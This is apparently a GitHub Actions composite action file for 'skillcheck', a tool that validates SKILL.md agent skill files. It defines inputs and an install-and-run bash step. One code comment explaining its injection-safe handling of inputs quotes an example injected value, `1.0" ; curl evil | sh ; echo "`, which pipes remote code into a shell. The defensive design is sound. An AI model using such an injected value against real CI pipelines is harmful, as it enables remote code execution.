name: "skillcheck"
description: "Cross-agent skill quality gate for SKILL.md files. Validates against the agentskills.io specification."
author: "Brad Kinnard (moonrunnerkc), Aftermath Technologies Ltd"

branding:
  icon: "check-circle"
  color: "green"

inputs:
  path:
    description: "Path to a SKILL.md file or directory to scan recursively."
    required: false
    default: "."
  version:
    description: "skillcheck version to install from PyPI (e.g., '1.4.1'). Leave empty to install from the action's own checkout."
    required: false
    default: ""
  min-desc-score:
    description: "Minimum description quality score (0-100). Below this triggers a warning."
    required: false
    default: ""
  target-agent:
    description: "Scope compat checks: claude, vscode, cursor, or all (default: all)."
    required: false
    default: ""
  strict-vscode:
    description: "Promote VS Code compat issues to errors."
    required: false
    default: "false"
  strict-cursor:
    description: "Promote Cursor compat issues to errors."
    required: false
    default: "false"
  strict:
    description: "Strict mode. Escalates warnings to exit 1 and enables --strict-vscode and --strict-cursor."
    required: false
    default: "false"
  skip-dirname-check:
    description: "Skip directory-name matching check."
    required: false
    default: "false"
  skip-ref-check:
    description: "Skip file reference validation."
    required: false
    default: "false"
  ignore:
    description: "Comma-separated rule prefixes to suppress (e.g., 'sizing,disclosure')."
    required: false
    default: ""
  max-lines:
    description: "Override the line-count threshold (default: 500)."
    required: false
    default: ""
  max-tokens:
    description: "Override the token-count threshold (default: 8000)."
    required: false
    default: ""
  format:
    description: "Output format. Defaults to github for automatic PR annotations."
    required: false
    default: "github"
  semantic:
    description: "Enable semantic-adjacent validation. In standalone CI this enables heuristic graph analysis."
    required: false
    default: "false"
  analyze-graph:
    description: "Run heuristic capability graph analyzers and merge diagnostics into the report."
    required: false
    default: "false"
  ingest-critique:
    description: "Path to an agent self-critique JSON response to ingest."
    required: false
    default: ""
  critique-agent:
    description: "Critique prompt/source agent: claude, codex, or cursor."
    required: false
    default: ""
  ingest-graph:
    description: "Path to an agent graph-extraction JSON response to ingest."
    required: false
    default: ""
  graph-agent:
    description: "Graph prompt/source agent: claude, codex, or cursor."
    required: false
    default: ""
  history:
    description: "Append a validation record to .skillcheck-history.json."
    required: false
    default: "false"
  fail-on-regression:
    description: "With --history, exit 1 on history.skill.regressed. Independent of --strict."
    required: false
    default: "false"
  explain-score:
    description: "Show per-dimension breakdown for description quality scores."
    required: false
    default: "false"
  activation-hypotheses:
    description: "Generate activation hypotheses. This is an emit mode and does not produce PR annotations."
    required: false
    default: "false"
  tiktoken:
    description: "Install the optional tiktoken extra for more accurate token estimates."
    required: false
    default: "false"

runs:
  using: "composite"
  steps:
    - name: Set up Python
      uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
      with:
        python-version: "3.12"

    - name: Install and run skillcheck
      shell: bash
      # Inputs are passed through env so their values never expand into the
      # script source. Referencing them as "$INPUT_*" keeps a value like
      # `1.0" ; curl evil | sh ; echo "` an inert string instead of injected
      # shell. Do NOT reference ${{ inputs.* }} directly inside this run block.
      env:
        INPUT_VERSION: ${{ inputs.version }}
        INPUT_TIKTOKEN: ${{ inputs.tiktoken }}
        INPUT_PATH: ${{ inputs.path }}
        INPUT_FORMAT: ${{ inputs.format }}
        INPUT_STRICT_VSCODE: ${{ inputs.strict-vscode }}
        INPUT_STRICT_CURSOR: ${{ inputs.strict-cursor }}
        INPUT_STRICT: ${{ inputs.strict }}
        INPUT_SKIP_DIRNAME_CHECK: ${{ inputs.skip-dirname-check }}
        INPUT_SKIP_REF_CHECK: ${{ inputs.skip-ref-check }}
        INPUT_SEMANTIC: ${{ inputs.semantic }}
        INPUT_ANALYZE_GRAPH: ${{ inputs.analyze-graph }}
        INPUT_HISTORY: ${{ inputs.history }}
        INPUT_FAIL_ON_REGRESSION: ${{ inputs.fail-on-regression }}
        INPUT_EXPLAIN_SCORE: ${{ inputs.explain-score }}
        INPUT_ACTIVATION_HYPOTHESES: ${{ inputs.activation-hypotheses }}
        INPUT_MIN_DESC_SCORE: ${{ inputs.min-desc-score }}
        INPUT_TARGET_AGENT: ${{ inputs.target-agent }}
        INPUT_MAX_LINES: ${{ inputs.max-lines }}
        INPUT_MAX_TOKENS: ${{ inputs.max-tokens }}
        INPUT_INGEST_CRITIQUE: ${{ inputs.ingest-critique }}
        INPUT_CRITIQUE_AGENT: ${{ inputs.critique-agent }}
        INPUT_INGEST_GRAPH: ${{ inputs.ingest-graph }}
        INPUT_GRAPH_AGENT: ${{ inputs.graph-agent }}
        INPUT_IGNORE: ${{ inputs.ignore }}
      run: |
        # Install strategy:
        # 1. INPUT_VERSION set -> pin to that PyPI version (covers the rare
        #    case of running an older skillcheck against newer action sources).
        # 2. INPUT_VERSION empty AND $GITHUB_ACTION_PATH/pyproject.toml present
        #    -> install from the action's own checkout. This is how composite
        #    actions are laid out by actions/checkout: the tag the user wrote in
        #    `uses:` is checked out into $GITHUB_ACTION_PATH, so installing from
        #    there pins skillcheck to that tag's source and closes any PyPI/tag
        #    drift. `uses: ./` dogfood jobs also resolve here.
        # 3. Otherwise fall back to the PyPI range. This only fires in edge cases
        #    where $GITHUB_ACTION_PATH does not contain a checkout (e.g. a
        #    user-built container that drops the action sources).
        if [ -n "$INPUT_VERSION" ]; then
          if [ "$INPUT_TIKTOKEN" = "true" ]; then
            pip install --quiet "skillcheck[tiktoken]==$INPUT_VERSION"
          else
            pip install --quiet "skillcheck==$INPUT_VERSION"
          fi
        elif [ -f "${GITHUB_ACTION_PATH}/pyproject.toml" ]; then
          if [ "$INPUT_TIKTOKEN" = "true" ]; then
            pip install --quiet "${GITHUB_ACTION_PATH}[tiktoken]"
          else
            pip install --quiet "${GITHUB_ACTION_PATH}"
          fi
        else
          if [ "$INPUT_TIKTOKEN" = "true" ]; then
            pip install --quiet "skillcheck[tiktoken]>=1.2,<2"
          else
            pip install --quiet "skillcheck>=1.2,<2"
          fi
        fi

        args=()
        args+=("$INPUT_PATH")
        args+=("--format" "$INPUT_FORMAT")

        [ "$INPUT_STRICT_VSCODE" = "true" ] && args+=("--strict-vscode")
        [ "$INPUT_STRICT_CURSOR" = "true" ] && args+=("--strict-cursor")
        [ "$INPUT_STRICT" = "true" ] && args+=("--strict")
        [ "$INPUT_SKIP_DIRNAME_CHECK" = "true" ] && args+=("--skip-dirname-check")
        [ "$INPUT_SKIP_REF_CHECK" = "true" ] && args+=("--skip-ref-check")
        [ "$INPUT_SEMANTIC" = "true" ] && args+=("--semantic")
        [ "$INPUT_ANALYZE_GRAPH" = "true" ] && args+=("--analyze-graph")
        [ "$INPUT_HISTORY" = "true" ] && args+=("--history")
        [ "$INPUT_FAIL_ON_REGRESSION" = "true" ] && args+=("--fail-on-regression")
        [ "$INPUT_EXPLAIN_SCORE" = "true" ] && args+=("--explain-score")
        [ "$INPUT_ACTIVATION_HYPOTHESES" = "true" ] && args+=("--activation-hypotheses")
        [ -n "$INPUT_MIN_DESC_SCORE" ] && args+=("--min-desc-score" "$INPUT_MIN_DESC_SCORE")
        [ -n "$INPUT_TARGET_AGENT" ] && args+=("--target-agent" "$INPUT_TARGET_AGENT")
        [ -n "$INPUT_MAX_LINES" ] && args+=("--max-lines" "$INPUT_MAX_LINES")
        [ -n "$INPUT_MAX_TOKENS" ] && args+=("--max-tokens" "$INPUT_MAX_TOKENS")
        [ -n "$INPUT_INGEST_CRITIQUE" ] && args+=("--ingest-critique" "$INPUT_INGEST_CRITIQUE")
        [ -n "$INPUT_CRITIQUE_AGENT" ] && args+=("--critique-agent" "$INPUT_CRITIQUE_AGENT")
        [ -n "$INPUT_INGEST_GRAPH" ] && args+=("--ingest-graph" "$INPUT_INGEST_GRAPH")
        [ -n "$INPUT_GRAPH_AGENT" ] && args+=("--graph-agent" "$INPUT_GRAPH_AGENT")
        IFS=',' read -ra PREFIXES <<< "$INPUT_IGNORE"
        for p in "${PREFIXES[@]}"; do
          [ -n "$p" ] && args+=("--ignore" "$(echo "$p" | xargs)")
        done

        skillcheck "${args[@]}"